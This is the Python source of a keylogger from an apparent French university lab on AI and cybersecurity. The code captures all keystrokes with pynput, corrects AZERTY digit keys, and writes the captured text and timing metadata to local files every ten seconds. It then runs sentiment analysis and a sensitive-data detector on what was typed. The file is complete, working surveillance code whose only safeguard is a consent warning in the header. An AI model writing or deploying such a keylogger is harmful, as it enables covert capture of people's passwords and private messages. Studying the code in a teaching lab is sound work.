"""
keylogger.py — Partie I : Capture et enregistrement des frappes clavier
TP1 — Intelligence Artificielle & Cybersécurité

CORRECTIFS v2 :
    ✅ BUG AZERTY — Les touches numériques sans Shift retournaient les caractères
       non-shiftés du clavier AZERTY (à, ç, é, ", ', (, -, è, _, ç) au lieu des
       chiffres (0-9). Correction via key.vk (virtual key code indépendant du layout).
    ✅ PIPELINE TEMPS RÉEL — report() appelle maintenant sentiment_analyzer et
       sensitive_detector à chaque flush → sentiments.json et detections.json
       sont mis à jour en continu, ce qui alimente le dashboard.
    ✅ THREAD-SAFE — lock sur le buffer avant chaque flush.
    ✅ MÉTADONNÉES — sauvegarde continue dans metadata.json.

⚠️  USAGE ÉTHIQUE UNIQUEMENT — cadre pédagogique.
    Toute utilisation sans consentement explicite est illégale (RGPD, Loi Godfrain).
"""

import json
import os
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

from pynput import keyboard

# ── Résolution des chemins (fonctionne quelle que soit la CWD) ───────────────
ROOT = Path(__file__).resolve().parent
DATA = ROOT / "data"

LOG_PATH      = DATA / "log.txt"
METADATA_PATH = DATA / "metadata.json"

# ── Variables globales ────────────────────────────────────────────────────────
log: str = ""
last_key_time: float = time.time()
keystroke_metadata: list = []
_buffer_lock = threading.Lock()

# ── Pipeline IA (chargé une fois au démarrage) ────────────────────────────────
_ml_model  = None
_ml_scaler = None
_pipeline_ready = False

def _init_pipeline() -> None:
    """Charge ou entraîne le modèle ML de détection de données sensibles."""
    global _ml_model, _ml_scaler, _pipeline_ready
    try:
        sys.path.insert(0, str(ROOT))
        from sensitive_detector import load_ml_classifier, train_ml_classifier
        _ml_model, _ml_scaler = load_ml_classifier()
        if _ml_model is None:
            print("[INFO] Modèle ML absent → entraînement rapide...")
            _ml_model, _ml_scaler = train_ml_classifier()
        _pipeline_ready = True
        print("[INFO] Pipeline IA prêt.")
    except Exception as e:
        print(f"[AVERTISSEMENT] Pipeline IA non disponible : {e}")


# ════════════════════════════════════════════════════════════════════════════════
# CORRECTIF AZERTY — Mapping virtual key code → chiffre
# ════════════════════════════════════════════════════════════════════════════════
#
# Problème : sur un clavier AZERTY, les chiffres se trouvent sur la rangée du
# haut mais leur caractère « sans Shift » est : à & é " ' ( - è _ ç
# pynput retourne key.char = 'à' quand l'utilisateur appuie sur la touche '0'
# sans Shift. key.vk retourne le code virtuel de la TOUCHE PHYSIQUE, qui est
# identique quel que soit le layout → 48 pour la touche 0, 57 pour la touche 9.
#
# VK 48-57 correspondent à '0'-'9' (identique à la valeur ASCII).
#
# Cas particuliers gérés :
#   - Shift enfoncé  → key.char retourne déjà le bon chiffre ('0' à '9') ✓
#   - AltGr          → génère des caractères comme @, #, { etc. → laissés tels quels ✓
#   - Chiffre pavé   → key.vk 96-105 (Numpad) → mappé aussi ✓

_VK_TO_DIGIT = {
    # Rangée du haut AZERTY / QWERTY (sans Shift)
    48: '0', 49: '1', 50: '2', 51: '3', 52: '4',
    53: '5', 54: '6', 55: '7', 56: '8', 57: '9',
    # Pavé numérique
    96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
    101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
}

# Caractères non-shiftés du clavier AZERTY qui DOIVENT être remplacés
# par leur équivalent chiffre lorsque key.vk confirme qu'il s'agit d'une touche numérique.
_AZERTY_UNSHIFTED = set('àáâãäåæ&éêëèìíîïðñòóôõöùúûüýÿçœ"\'(-)_')

def _fix_azerty_digit(key) -> str | None:
    """
    Retourne le chiffre correct si la touche est une touche numérique
    pressée sans Shift sur un clavier AZERTY, sinon None.

    Logique :
    1. key.vk doit être dans _VK_TO_DIGIT (c'est une touche numérique physiquement).
    2. key.char ne doit pas déjà être un chiffre (si Shift était enfoncé,
       key.char est déjà correct → on ne touche pas).
    3. key.char ne doit pas être un symbole AltGr (@, #, ~, etc.) → longueur 1,
       pas alphanumérique, pas dans les caractères AZERTY non-shiftés connus.
    """
    try:
        vk = getattr(key, 'vk', None)
        if vk is None:
            return None

        digit = _VK_TO_DIGIT.get(vk)
        if digit is None:
            return None

        char = getattr(key, 'char', None)
        if char is None:
            return None

        # Si key.char est déjà un chiffre → Shift était enfoncé → correct
        if char.isdigit():
            return None

        # Si c'est un caractère AltGr spécial (@ # { } etc.) → ne pas substituer
        # Ces caractères ne font PAS partie de l'ensemble AZERTY non-shiftés classiques
        if char not in _AZERTY_UNSHIFTED and not char.isalpha():
            return None

        # → Touche numérique sans Shift sur AZERTY : substituer
        return digit

    except Exception:
        return None


# ════════════════════════════════════════════════════════════════════════════════
# Traitement des touches
# ════════════════════════════════════════════════════════════════════════════════

def processkeys(key) -> None:
    """Callback pynput — appelé à chaque appui de touche."""
    global log, last_key_time

    now             = time.time()
    inter_key_delay = round(now - last_key_time, 4)
    last_key_time   = now
    char_logged     = ""

    try:
        raw_char = key.char

        # ── CORRECTIF AZERTY : remplacer les pseudo-caractères non-shiftés par le chiffre ──
        fixed = _fix_azerty_digit(key)
        if fixed is not None:
            char_logged = fixed
            log += fixed
        else:
            char_logged = raw_char
            log += raw_char

    except AttributeError:
        # Touche spéciale (Key.space, Key.enter, etc.)
        if key == keyboard.Key.space:
            char_logged = " "
            log += " "
        elif key == keyboard.Key.enter:
            char_logged = "\n"
            log += "\n"
        elif key == keyboard.Key.backspace:
            char_logged = "[BACK]"
            if log:
                log = log[:-1]
        elif key == keyboard.Key.tab:
            char_logged = "\t"
            log += "\t"
        else:
            char_logged = ""

    # Méta-données pour la détection d'anomalies
    keystroke_metadata.append({
        "timestamp":       now,
        "datetime":        datetime.fromtimestamp(now).isoformat(),
        "inter_key_delay": inter_key_delay,
        "key_type":        _classify_key_type(key),
        "char":            char_logged,
    })


def _classify_key_type(key) -> str:
    """Catégorise une touche : alphanum | special | navigation | modifier | function."""
    try:
        if key.char is not None:
            return "alphanum" if key.char.isalnum() else "special"
    except AttributeError:
        pass

    navigation_keys = {
        keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right,
        keyboard.Key.home, keyboard.Key.end, keyboard.Key.page_up, keyboard.Key.page_down,
        keyboard.Key.delete, keyboard.Key.backspace, keyboard.Key.tab,
    }
    modifier_keys = {
        keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
        keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r,
        keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
        keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r,
    }
    if key in navigation_keys:
        return "navigation"
    if key in modifier_keys:
        return "modifier"
    return "function"


# ════════════════════════════════════════════════════════════════════════════════
# Sauvegarde des métadonnées
# ════════════════════════════════════════════════════════════════════════════════

def _flush_metadata(entries: list) -> None:
    """Sauvegarde les métadonnées de frappe (append, max 10 000 entrées)."""
    DATA.mkdir(exist_ok=True)
    existing = []
    if METADATA_PATH.exists():
        try:
            with open(METADATA_PATH, "r", encoding="utf-8") as f:
                existing = json.load(f)
        except Exception:
            existing = []
    existing.extend(entries)
    existing = existing[-10000:]
    with open(METADATA_PATH, "w", encoding="utf-8") as f:
        json.dump(existing, f, ensure_ascii=False)


# ════════════════════════════════════════════════════════════════════════════════
# Pipeline temps réel — Analyse IA après chaque flush
# ════════════════════════════════════════════════════════════════════════════════

def _run_analysis(text: str) -> None:
    """
    Lance l'analyse de sentiment ET la détection de données sensibles
    sur le texte capturé depuis le dernier flush.
    Exécuté dans un thread daemon pour ne pas bloquer le keylogger.
    """
    if not text.strip():
        return

    sys.path.insert(0, str(ROOT))

    # ── Analyse de sentiment ─────────────────────────────────────────────────
    try:
        from sentiment_analyzer import analyze_sentences_from_log, save_sentiment_results
        results = analyze_sentences_from_log(text)
        if results:
            out = str(DATA / "sentiments.json")
            save_sentiment_results(results, out)
    except Exception as e:
        print(f"[ERREUR sentiment] {e}")

    # ── Détection de données sensibles ───────────────────────────────────────
    try:
        from sensitive_detector import analyze_text, save_detections
        result = analyze_text(text, _ml_model, _ml_scaler)
        if result["has_sensitive"]:
            save_detections([result], str(DATA / "detections.json"))
            types = [d["type"] for d in result["detections"]]
            print(f"[ALERTE] Données sensibles : {types}")
    except Exception as e:
        print(f"[ERREUR détection] {e}")


# ════════════════════════════════════════════════════════════════════════════════
# Flush périodique
# ════════════════════════════════════════════════════════════════════════════════

def report(interval: int = 10) -> None:
    """
    Flush le buffer toutes les `interval` secondes :
      1. Écrit dans log.txt (mode append)
      2. Lance l'analyse IA en arrière-plan
      3. Sauvegarde les métadonnées de frappe
    """
    global log, keystroke_metadata

    DATA.mkdir(exist_ok=True)

    # ── Capture atomique du buffer ─────────────────────────────────────────
    with _buffer_lock:
        current_log      = log
        current_meta     = keystroke_metadata.copy()
        log              = ""
        keystroke_metadata.clear()

    # ── Écriture log.txt ───────────────────────────────────────────────────
    if current_log:
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        try:
            with open(LOG_PATH, "a", encoding="utf-8") as f:
                f.write(f"{timestamp}\n{current_log}\n{'—' * 40}\n")
        except IOError as e:
            print(f"[ERREUR log] {e}")

        # Analyse IA en arrière-plan (non bloquant)
        threading.Thread(
            target=_run_analysis,
            args=(current_log,),
            daemon=True,
            name="AI-Analysis"
        ).start()

    # ── Sauvegarde métadonnées ─────────────────────────────────────────────
    if current_meta:
        threading.Thread(
            target=_flush_metadata,
            args=(current_meta,),
            daemon=True,
            name="Metadata-Flush"
        ).start()

    # Relancer le timer
    t = threading.Timer(interval, report, args=[interval])
    t.daemon = True
    t.start()


# ════════════════════════════════════════════════════════════════════════════════
# Point d'entrée
# ════════════════════════════════════════════════════════════════════════════════

def start(interval: int = 10, enable_ai: bool = True) -> None:
    """
    Démarre le keylogger avec le pipeline IA temps réel.

    Paramètres
    ----------
    interval  : Intervalle de flush en secondes (défaut : 10)
    enable_ai : Active l'analyse IA après chaque flush (défaut : True)
    """
    print(f"[INFO] Keylogger démarré. Log → {LOG_PATH}")
    print(f"[INFO] Pipeline IA : {'activé' if enable_ai else 'désactivé'}")
    print("[INFO] Appuyez sur Ctrl+C pour arrêter.\n")

    if enable_ai:
        threading.Thread(target=_init_pipeline, daemon=True).start()

    report(interval)

    listener = keyboard.Listener(on_press=processkeys)
    with listener:
        listener.join()


if __name__ == "__main__":
    start(interval=10, enable_ai=True)
